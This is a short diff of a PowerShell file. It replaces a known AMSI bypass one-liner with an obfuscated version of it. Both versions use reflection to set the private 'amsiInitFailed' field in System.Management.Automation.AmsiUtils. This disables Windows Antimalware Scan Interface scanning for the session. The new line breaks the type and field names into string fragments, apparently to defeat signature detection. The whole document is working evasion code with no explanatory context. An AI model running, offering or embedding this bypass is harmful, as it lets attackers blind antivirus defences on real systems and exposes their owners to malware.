@@ -1,4 +1,1 @@
-# ALL CREDIT TO @MATTEFESTATION FOR THE INITIAL TWEET
-
-$Ref=[Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils');
-$Ref.GetField('amsiIn'+'itFailed','NonPublic,Static').SetValue($null,$true);
+$d=[Ref].Assembly.GetType('S'+'y'+'s'+'tem'+'.Man'+'age'+'ment.Au'+'toma'+'tion'+'.A'+'ms'+'iU'+'ti'+'ls');$d.GetField('ams'+'iIn'+'itF'+'ailed','NonPublic,Static').SetValue($null,$true);
